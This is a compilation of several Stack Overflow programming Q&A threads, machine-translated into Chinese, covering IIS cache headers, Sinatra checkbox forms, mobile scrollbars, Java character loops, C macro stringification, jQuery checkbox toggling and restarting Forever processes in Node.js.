The following cacheable resources have a short freshness lifetime. Specify an expiration at least one week in the future for the following resources:
* https://local.example.com/Content/Images/image1.png (expiration not specified)
(etc) 
```

为什么它说“未指定到期”？

整个 webapp 都是通过 https 提供的，这是一个因素吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-03-18T00:39:19.560

我通过将指定的路径从更改`Content/Images`为刚刚解决了这个问题`Content`

```
<location path="Content">
    <system.webServer>
      <staticContent>
        <clientCache cacheControlCustom="public" 
                     cacheControlMode="UseMaxAge" 
                     cacheControlMaxAge="365.00:00:00" />
      </staticContent>
    </system.webServer>
  </location> 
```

所以它是固定的，但是路径的改变并不能说明问题到底是什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-29T17:17:10.537

我发现 Google PageSpeed 在某些情况下需要一些时间来“赶上”您最近所做的更改。确保您已完成整页刷新并点击 PageSpeed 本身的刷新按钮。如果做不到这一点，在 Firefox 上使用 Firebug 似乎总是在 net 选项卡中给出准确的结果。单击文件旁边的加号图标并检查响应标头。

# html - 如何使用 Sinatra 和 Sequel 从复选框 HTML 表单中获取数组？

> ID：12648969
> 
> 赞同：2
> 
> 时间：2012-09-29T00:45:48.820
> 
> 标签：html, ruby, forms, checkbox, sinatra

这是我的表格：

```
<form action="/results" method="post" name="checkbox_form">
    <input type="checkbox" name="item" value="Bacon">Bacon (1 lb., sliced)<br>
    <input type="checkbox" name="item" value="Eggs (dozen)">Eggs (1 dozen)
    <input type="submit" value="Calculate">
</form> 
```

如果用户同时选中“培根”和“鸡蛋（1 打）”框，我如何使用 Sinatra 和/或 Sequel 来返回此数组：

```
["Bacon","Eggs (dozen)"] 
```

如您所见，数组元素是表单的“值”元素。

作为一个附带问题：无论如何，Sinatra 如何处理复选框表单？我在 Sinatra 手册中找不到任何好的信息。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-29T04:32:50.543

您实际上不需要 Sequel从请求中*接收*项目。`post`Sequel 是一个数据库，因此您可以在从您的`post`. 因此，在这种情况下，您实际上并不需要它来返回数组。

此外，表单和复选框并非特定于 Sinatra，而是*特定*于 HTML。

当您将表单作为`post`请求提交时，它会被发送回服务器和 Sinatra 进行处理。Sinatra 提供了一种`params`方法，其中包含提交的表单值的哈希值。

在下面的示例中，我使用特殊语法 ( `item[]`) 在 params 哈希中提供命名`item`为数组的值。例如，这是 params 哈希`{"item"=>["Bacon", "Eggs (dozen)"]}`在选中两个复选框时返回的内容。

```
require 'sinatra'

get '/results' do
  erb :results
end
post '/results' do
   params[:item].inspect
end

__END__

@@ results
<form action="/results" method="post" name="checkbox_form">
    <input type="checkbox" name="item[]" value="Bacon">Bacon (1 lb., sliced)<br/>
    <input type="checkbox" name="item[]" value="Eggs (dozen)">Eggs (1 dozen)<br/>
    <input type="submit" value="Calculate"/>
</form> 
```

该`get`块接收来自用户浏览器的获取请求并处理它。在此示例中，它向用户返回一个 HTML 表单。

在用户提交表单后，该`post`块会收到来自用户浏览器的发布请求。向用户显示来自服务器的响应，在这种情况下是复选框值的数组。

# jquery - 如何在移动设备中添加回滚动条？

> ID：12648985
> 
> 赞同：-2
> 
> 时间：2012-09-29T00:50:42.023
> 
> 标签：jquery, html, css, twitter-bootstrap

我已经将滚动条从页面的标题区域中移除，它看起来不错，除了在移动设备上（至少是 iPhone，我不了解 Android），滚动条完全消失了。我该如何取回它？

[我的小提琴](http://jsfiddle.net/RgRWB/3/show)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T04:29:52.317

你可以尝试不同的方法。使整个页面像正常滚动（否`overflow-y`）并通过将标题固定到顶部`position:fixed;`（我认为这就是您想要的？）

这是您的小提琴的编辑版本：http: [//jsfiddle.net/TnKNe/](http://jsfiddle.net/TnKNe/)

如果这不起作用，您可以试试[这个 jQuery 自定义内容滚动器](http://manos.malihu.gr/jquery-custom-content-scroller)，它可以让您完全控制元素的滚动。它说它也有移动支持，但我以前从未使用过它，所以里程可能会有所不同。

**注意：** `position:fixed;`在 Android 中不支持或根本不支持。iOS4 及更早版本将其视为`position:static;`. iOS5 和最新的 Android 都支持它：http: [//caniuse.com/css-fixed](http://caniuse.com/css-fixed)

**更新：**

我发现[这个关于 ios5 内容滚动的教程](http://mobile.tutsplus.com/tutorials/mobile-web-apps/ios-5-fixed-positioning-and-content-scrolling/)看起来很适合你！他们用来获取中间可滚动区域的固定标题的技术显然仅适用于 ios5 和更新版本。他们有[另一个教程用一个名为 iScroll 的插件做同样的事情，](http://mobile.tutsplus.com/tutorials/mobile-web-apps/introduction-to-iscroll/)它看起来更健壮并且也适用于 Android。看起来这正是你想要的。这是[iScroll 网站](http://cubiq.org/iscroll)。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-29T01:10:40.377

在移动设备上，滚动条通常是不可见的，直到您开始滚动（在屏幕上拖动手指）。即使那样，它们也只是一个细小的指示器，告诉您您在页面上的位置，您实际上无法触摸它来移动（仅在某些应用程序/浏览器中）。

原因是手机很窄。您不希望滚动条占用屏幕宽度的 5-10% 来浪费空间。

# java - 使用 for 循环在字符串数组中打印索引号和该索引中的字符

> ID：12648987
> 
> 赞同：1
> 
> 时间：2012-09-29T00:51:13.967
> 
> 标签：java, arrays, for-loop

我正在尝试使用 for 循环检查一维字符串数组中的每个字符并打印“字符 [a] 为大写”或“字符 [b] 为小写”或“字符 [c] 为空格”。我还必须打印索引号和该索引中的字符。

我以为我应该用大写字母和小写字母创建单独的字符串，但结果我错了。我也不知道我是否应该将字符串数组转换为字符数组？

我想我应该使用`charAt()`方法，但我不知道如何。

这就是我所做的：

```
for(x = 0; x < fullName.length(); x++)
{
    if(fullName[0] == nameUpperCase[2]);
    {
        System.out.print("character [0] located at position [0] is  lowercase");
    }

    if(fullName[1] == nameLowerCase[4]);
    {
        System.out.print("character [b] located at position [1] is uppercase"); 
    }
} 
```

正如你所看到的，我什至不知道如何使用循环来打印“a”或“b”，所以我不得不手动插入每一个以及它们所在的位置......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:57:01.313

```
fullName[0] == nameUpperCase[2] 
```

上面的表述是错误的。我假设 fullName 是您的 for 循环中的**字符串**，因为您正在使用**full.length()**方法。fullName 不是数组，所以做 fullName[0] 是错误的。要获取字符串中的字符，请使用 String.charAt(index) 方法。作为初学者，请查看[String Class API](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/String.html)以供参考。

我想你可以做这样的事情：

```
 String[] s= {"Ab "};
    for(String ss: s) {
         for(int i=0; i<ss.length(); i++) {
             if(Character.isUpperCase(ss.charAt(i))) {
                 System.out.println("character "+ss.charAt(i)+" located at position"+i+ " is  lowercase");
             }
             else if(Character.isLowerCase(ss.charAt(i))) {
                 System.out.println("character "+ss.charAt(i)+" located at position"+i+ " is  lowercase");
             }
             else if(else if(Character.isSpaceChar(ss.charAt(i)))) {
                 System.out.println("character "+ss.charAt(i)+" located at position"+i+ " is  lowercase");
             }
         } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T00:58:16.797

可能有更简单的方法，但这可能会奏效。

```
if (str.toUppercase().equals(str)) {
    // It's uppercase.
}

if (str.toLowerCase().equals(str)) {
    // It's lowercase.
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-29T01:03:32.777

如果您正在比较两个字符串（即数组是`String[]`），那么您的代码正在比较每个字符串的内存引用，这将是不同的。

为了比较`String`是否相等，您需要使用该`equals`方法。

```
for(x = 0; x < fullName.length(); x++)
{
    if(fullName[0].equals(nameUpperCase[2]));
    {
        System.out.print("character [0] located at position [0] is  lowercase");
    }

    if(fullName[1].equals(nameLowerCase[4]));
    {
        System.out.print("character [b] located at position [1] is uppercase"); 
    }

} 
```

我还建议您从其他答案中汲取一些想法。

将原始转换`String`为 char 数组而不是...

```
char[] fullName = name.toCharArray(); 
```

或者您可以简单地获取给定索引处的字符...

```
for(x = 0; x < originalString.length(); x++)
{
    char charAt = originalString.charAt(x);
    if(Character.isUpperCase(charAt));
    {
        System.out.print("character [0] located at position [0] is  lowercase");
    }

    if(Character.toUpperCase(originalString.charAt(1)) == originalString.charAt(4));
    {
        System.out.print("character [b] located at position [1] is uppercase"); 
    }

} 
```

**更新示例**

既然我们已经确定我们无法将`String`值与进行比较`==`，这里有一个我认为你想要实现的工作示例......

```
String value = "This is a simple string";
for (int index = 0; index < value.length(); index++) {

    String whatIs = "Unknown";
    if (Character.isUpperCase(value.charAt(index))) {
        whatIs = "Upper case";
    } else if (Character.isLowerCase(value.charAt(index))) {
        whatIs = "Lower case";
    } else if (Character.isSpaceChar(value.charAt(index))) {
        whatIs = "Space";
    } else if (Character.isDigit(value.charAt(index))) {
        whatIs = "Digit";
    }

    System.out.println("Character @ " + index + " (" + value.charAt(index) + ") is a " + whatIs + " character");

} 
```

哪个输出

```
Character @ 0 (T) is a Upper case character
Character @ 1 (h) is a Lower case character
Character @ 2 (i) is a Lower case character
Character @ 3 (s) is a Lower case character
Character @ 4 ( ) is a Space character
Character @ 5 (i) is a Lower case character
Character @ 6 (s) is a Lower case character
Character @ 7 ( ) is a Space character
Character @ 8 (a) is a Lower case character
Character @ 9 ( ) is a Space character
Character @ 10 (s) is a Lower case character
Character @ 11 (i) is a Lower case character
Character @ 12 (m) is a Lower case character
Character @ 13 (p) is a Lower case character
Character @ 14 (l) is a Lower case character
Character @ 15 (e) is a Lower case character
Character @ 16 ( ) is a Space character
Character @ 17 (s) is a Lower case character
Character @ 18 (t) is a Lower case character
Character @ 19 (r) is a Lower case character
Character @ 20 (i) is a Lower case character
Character @ 21 (n) is a Lower case character
Character @ 22 (g) is a Lower case character 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-29T01:05:00.613

如果您使用的是`String`，您可以简单地使用`charAt`来选择字符。不可能使用例如 . 来选择单个字符`fullName[0]`。如果是字符数组，则此表示法*是可能的。*`fullName`

```
String fullName = "Stack Overflow";
for (int x = 0; x < fullName.length(); x++)
{
   char testChar = fullName.charAt(x);
   if (Character.isLowerCase(testChar))
   {
     System.out.println("character [" + testChar + "] located at position [" + x + "] is lowercase");
   }
   else if (Character.isUpperCase(testChar))
   {
      System.out.println("character [" + testChar + "] located at position [" + x + "] is uppercase");
   }
   else if (Character.isSpaceChar(testChar)) {
     System.out.println("character [" + testChar + "] located at position [" + x + "] is a space");
  }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-29T00:56:32.287

你可能想试试，

```
 for(x = 0; x < fullName.length(); x++)
    {
        if( fullName[x].equals(nameUpperCase[x]) );
        {
            System.out.print("character [" + fullName[x] + "] located at position [" + x +       "] is lowercase.");
        }

        if( fullName[x].equals(nameLowerCase[x]) );
        {
            System.out.print("character [" + fullName[x] + "] located at position [" + x + "] is  uppercase."); 
        }

    } 
```

如果**fullName、nameUpperCase 和 nameLowerCase**是字符串数组，它应该可以正常工作。虽然，查看其他人发布的解决方案，我建议您查看那些更清晰和更清洁的代码。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-29T01:04:00.330

你可能想要这样的东西：

```
String s = "Hello World";
for (int i = 0 ; i < s.length() ; i++) {
    char c = s.charAt(i);
    if (c == ' ')
        System.out.println("character located at position [" + i + "] is a space");
    else if (Character.isUpperCase(c))
        System.out.println("character [" + c + "] located at position [" + i + "] is uppercase");
    else if (Character.isLowerCase(c))
        System.out.println("character [" + c + "] located at position [" + i + "] is lowercase");
    // else character is not recognized
} 
```

当然，我在`String`这里只使用了一个，但在 a 的情况下`String[]`，您可以简单地将这个过程应用于每个成员。

# c - 将#defined 常量转换为字符串

> ID：12648988
> 
> 赞同：6
> 
> 时间：2012-09-29T00:51:19.783
> 
> 标签：c, macros, c-preprocessor, c-strings, stringification

我定义了一个常量：

```
#define MAX_STR_LEN 100 
```

我正在尝试这样做：

```
scanf("%" MAX_STR_LEN "s", p_buf); 
```

但这当然行不通。

可以使用什么预处理器技巧将 MAX_STR_LEN 数字转换为字符串，以便我可以在上面的 scanf 调用中使用它？基本上：

```
scanf("%" XYZ(MAX_STR_LEN) "s", p_buf); 
```

XYZ() 应该是什么？

注意：我当然可以直接执行“%100s”，但这违背了目的。我也可以做#define MAX_STR_LEN_STR "100"，但我希望有一个更优雅的解决方案。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-09-29T00:53:13.287

使用`#`预处理运算符。此运算符仅在宏扩展期间有效，因此您需要一些宏来帮助。此外，由于宏替换算法固有的特性，您需要一个间接层。结果如下所示：

```
#define STRINGIZE_(x) #x
#define STRINGIZE(x) STRINGIZE_(x)

scanf("%" STRINGIZE(MAX_STR_LEN) "s", p_buf); 
```

# jquery - 将 jQuery prop() 更改为 hasclass() 函数的问题

> ID：12648994
> 
> 赞同：-1
> 
> 时间：2012-09-29T00:53:16.640
> 
> 标签：jquery, checkbox, checked

我有一个使用复选框的单击属性来显示/隐藏 div 的界面。

这是显示或隐藏功能的示例代码块：

**显示/隐藏 jQuery 代码**

```
/* Only display LinkedIn sortable icon if "Display LinkedIn" is ticked */
$('#display_linkedin_icon').live("click", function() {
    if ($('#display_linkedin_icon').prop("checked")) {
        $('#LinkedIn').show();
    }
    else {
        $('#LinkedIn').hide();
    }
}); 
```

这很好用，但是我想为一些花哨的 jQuery 样式复选框更改普通复选框。我希望在检查精美的复选框时仍会发射相同的jQuery操作。复选框类似于 jQuery iPhone 复选框。

这是花哨的复选框的 jQuery 代码。

**花式复选框 jQuery 代码**

```
$('.asw-switch-link a').live('click',function(){
    var $tag = $(this).parent();
    $('a',$tag).toggleClass('active');
    var rel = $('a.active',$tag).attr('rel');
    $tag.next('.plugin-switch-value').val(rel);

    return false;
}); 
```

并显示它们我使用：

```
case 'fancycheckbox':
        echo '<div class="asw-switch-link">';
        echo '<a href="#" rel="true" class="link-true ';
        echo esc_attr($options[$id]) == 'true' ? 'active' : '' ;
        echo '"></a>';
        echo '<a href="#" rel="false" class="link-false ';
        echo esc_attr($options[$id]) == 'false' ? 'active' : '' ;
        echo '"></a></div>';
        echo '<input id="'.$id.'" name="'.$this->prefix.'_options['.$id.']" class="plugin-switch-value" type="hidden" value="'.esc_attr($options[$id]).'" />';

        if($desc != '')
            echo '<span class="description">'.$desc.'</span>';

        break; 
```

上面的代码是我正在开发的 WordPress 插件的一部分。

**问题**

问题是我现在已将普通复选框更改为花哨的复选框，因此 jQuery“单击”功能不再起作用。

通过查看花哨的复选框 jQuery 代码，我想我可能必须使用 JQuery hasclass() 函数而不是 .prop('checked") 函数来检查 CSS 类“活动”

我认为这样的事情可能会奏效

```
/* Only display LinkedIn sortable icon if "Display LinkedIn" is ticked */
$('#display_linkedin_icon').live("click", function() {
    if ($('#display_linkedin_icon').hasclass("active")) {
        $('#LinkedIn').show();
    }
    else {
        $('#LinkedIn').hide();
    }
}); 
```

但它不起作用。

任何帮助将不胜感激

**HTML 代码**

这是 LinkedIn 复选框的 HTML 源代码

```
 <label for="display_linkedin_icon">Display LinkedIn icon?</label></th>
    <div class="asw-switch-link"><a href="#" rel="true" class="link-true active"></a><a href="#" rel="false" class="link-false "></a></div>
    <input id="display_linkedin_icon" name="asw_options[display_linkedin_icon]" class="plugin-switch-value" type="hidden" value="true" />
<span class="description">URL will be the blog article URL or page URL.</span> 
```

**切换的#LinkedIn div**

```
<ul id="asw-sortable">
<li id="Delicious"><span class="sortable-Delicious"></span><span class="sn">Delicious</span></li>
<li id="Twitter"><span class="sortable-Twitter"></span><span class="sn">Twitter</span></li>
<li id="Facebook"><span class="sortable-Facebook"></span><span class="sn">Facebook</span></li>
<li id="Googleplus"><span class="sortable-Googleplus"></span><span class="sn">Googleplus</span></li>
<li id="Stumbleupon"><span class="sortable-Stumbleupon"></span><span class="sn">Stumbleupon</span></li>
<li id="Pinterest"><span class="sortable-Pinterest"></span><span class="sn">Pinterest</span></li>
<li id="LinkedIn"><span class="sortable-LinkedIn"></span><span class="sn">LinkedIn</span></li>
<li id="Youtube"><span class="sortable-Youtube"></span><span class="sn">Youtube</span></li> 
```

上面的代码是可排序部分的一部分。我包含了所有图标，因此您可以看到，一旦我为 LinkedIn 图标弄清楚了这一点，我就会复制其他图标的代码。

**更新**

好的，到目前为止，我已经通过检查隐藏的表单字段值来在页面加载时显示#LinkedIn div。如果隐藏字段设置为“真”，则将显示#LinkedIn div。

**如果 value = 'true'，jQuery 在页面加载时显示 #LinkedIn**

```
$('#LinkedIn').hide();
if ($('#display_linkedin_icon').val() == 'true') {
    $('#LinkedIn').show();
} 
```

我仍然无法让#LinkedIn div 切换，但取决于花哨复选框的值。

已尝试使用此功能来切换#LinkedIn div

```
 $('#ch_display_linkedin_icon').click(function() {
        $('#LinkedIn').toggle( $(this).toggleClass('active').hasClass('active') );
    if ($('#ch_display_linkedin_icon').hasClass('active')) {
        $('#LinkedIn').hide();
    }
    else {
        $('#LinkedIn').show();
    }
}); 
```

我在花哨的复选框中添加了一个 ID。上面的 jQuery 确实开始切换 #LinkedIn div，但并不总是以正确的顺序。差不多好了

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:58:40.593

不要过度简化，但这应该可以正常工作：

```
$('#display_linkedin_icon').click(function() {
    $('#LinkedIn').toggle( $(this).toggleClass('active').hasClass('active') );
}); 
```

我使用未弃用的`.on()`vs `.live()`。

`active`我在单击的元素上切换类。

`#LinkedIn`最后，我根据单击的元素进行切换`.hasClass()`。

诗歌。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T00:59:39.937

尝试在事件范围之外设置一个变量，并在每次点击时递增。如果奇怪则显示否则隐藏图标

```
var checkCount = 0;
$('#display_linkedin_icon').live("click", function() {
    checkCount ++;
    if (!(checkCount  % 2== 0)) {
        $('#LinkedIn').show();
    }
    else {
        $('#LinkedIn').hide();
    }
}); 
```

# node.js - 如何以编程方式重新启动 Forever 中的孩子？

> ID：12648995
> 
> 赞同：0
> 
> 时间：2012-09-29T00:53:19.240
> 
> 标签：node.js, forever

我有两台服务器希望永远监控。如果一个重新启动，我需要重新启动另一个。

```
serverOne.on('restart', function(){
    serverTwo.restart();
}); 
```

尽管阅读代码暗示它应该这样做，但我尝试过的任何东西似乎都不起作用。我也试过：

```
serverTwo.restart();
serverTwo.kill(false);
serverTwo.kill(true);
serverTwo.stop(); 
```

在其他人中。

我知道我可能需要让 serverTwo 在它失去与 serverOne 的连接时做一些事情，但由于其他人目前正在开发这些，我正在寻找一种方法来暂时完成这项工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T01:22:12.683

我相信我已经用这条线做到了：

```
serverTwo.child.kill(); 
```

虽然这是否是我不知道的最佳做法......